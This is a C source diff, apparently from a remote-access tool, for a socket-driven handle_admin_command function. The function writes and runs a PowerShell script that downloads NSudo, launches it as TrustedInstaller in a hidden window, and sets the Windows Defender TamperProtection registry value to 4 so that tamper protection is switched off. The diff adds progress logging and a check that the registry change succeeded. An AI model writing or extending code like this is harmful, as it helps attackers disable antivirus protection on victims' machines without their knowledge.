@@ -205,12 +205,19 @@ static void handle_admin_command(SOCKET sock, const char *cmd_raw) {
         
         FILE *f = fopen(psPath, "w");
         if (f) {
+            fprintf(f, "Write-Host '[STEP 1] Starting NSUDO download...'\n");
             fprintf(f, "$out = Join-Path $env:TEMP 'NSudo'\n");
+            fprintf(f, "Write-Host \"[STEP 2] Output directory: $out\"\n");
             fprintf(f, "$null = New-Item -ItemType Directory -Path $out -Force -ErrorAction SilentlyContinue\n");
+            fprintf(f, "Write-Host '[STEP 3] Downloading zip file...'\n");
             fprintf(f, "$resp = Invoke-WebRequest -Uri 'https://github.com/M2TeamArchived/NSudo/releases/download/8.2/NSudo_8.2_All_Components.zip' -UseBasicParsing\n");
+            fprintf(f, "Write-Host \"[STEP 4] Download complete. Size: $($resp.Content.Length) bytes\"\n");
             fprintf(f, "$bytes = $resp.Content\n");
+            fprintf(f, "Write-Host '[STEP 5] Opening zip archive in memory...'\n");
             fprintf(f, "$stream = New-Object System.IO.MemoryStream($bytes)\n");
             fprintf(f, "$zip = [System.IO.Compression.ZipArchive]::new($stream)\n");
+            fprintf(f, "Write-Host \"[STEP 6] Zip contains $($zip.Entries.Count) files\"\n");
+            fprintf(f, "$extracted = 0\n");
             fprintf(f, "foreach ($entry in $zip.Entries) {\n");
             fprintf(f, "    $path = Join-Path $out $entry.FullName\n");
             fprintf(f, "    $dir = Split-Path $path -Parent\n");
@@ -220,15 +227,29 @@ static void handle_admin_command(SOCKET sock, const char *cmd_raw) {
             fprintf(f, "    $entryStream.CopyTo($fileStream)\n");
             fprintf(f, "    $fileStream.Close()\n");
             fprintf(f, "    $entryStream.Close()\n");
+            fprintf(f, "    $extracted++\n");
+            fprintf(f, "    Write-Host \"  Extracted: $($entry.FullName)\"\n");
             fprintf(f, "}\n");
+            fprintf(f, "Write-Host \"[STEP 7] Extraction complete. $extracted files written.\"\n");
             fprintf(f, "$zip.Dispose()\n");
             fprintf(f, "$stream.Dispose()\n");
+            fprintf(f, "Write-Host '[STEP 8] Checking for NSudoLG.exe...'\n");
             fprintf(f, "$exe = Join-Path $out 'NSudo Launcher\\x64\\NSudoLG.exe'\n");
+            fprintf(f, "Write-Host \"  Looking for: $exe\"\n");
             fprintf(f, "if (Test-Path $exe) {\n");
+            fprintf(f, "    Write-Host '[STEP 9] NSudoLG.exe FOUND. Running registry command...'\n");
             fprintf(f, "    Start-Process -FilePath $exe -ArgumentList '-U:T','-ShowWindowMode:Hide','reg','add','HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features','/v','TamperProtection','/t','REG_DWORD','/d','4','/f' -WindowStyle Hidden -Wait\n");
-            fprintf(f, "    Write-Host 'Tamper Protection disabled'\n");
+            fprintf(f, "    Write-Host '[STEP 10] Registry command completed. Verifying...'\n");
+            fprintf(f, "    $reg = Get-ItemProperty -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows Defender\\Features' -Name TamperProtection -ErrorAction SilentlyContinue\n");
+            fprintf(f, "    if ($reg.TamperProtection -eq 4) {\n");
+            fprintf(f, "        Write-Host '[SUCCESS] Tamper Protection disabled (value=4)'\n");
+            fprintf(f, "    } else {\n");
+            fprintf(f, "        Write-Host \"[WARNING] TamperProtection value is $($reg.TamperProtection), expected 4\"\n");
+            fprintf(f, "    }\n");
             fprintf(f, "} else {\n");
-            fprintf(f, "    Write-Host 'NSudoLG.exe not found after extraction'\n");
+            fprintf(f, "    Write-Host '[ERROR] NSudoLG.exe NOT found after extraction'\n");
+            fprintf(f, "    Write-Host '[DEBUG] Listing files in output directory:'\n");
+            fprintf(f, "    Get-ChildItem $out -Recurse -ErrorAction SilentlyContinue | ForEach-Object { Write-Host \"  $_.FullName\" }\n");
             fprintf(f, "}\n");
             fclose(f);
             
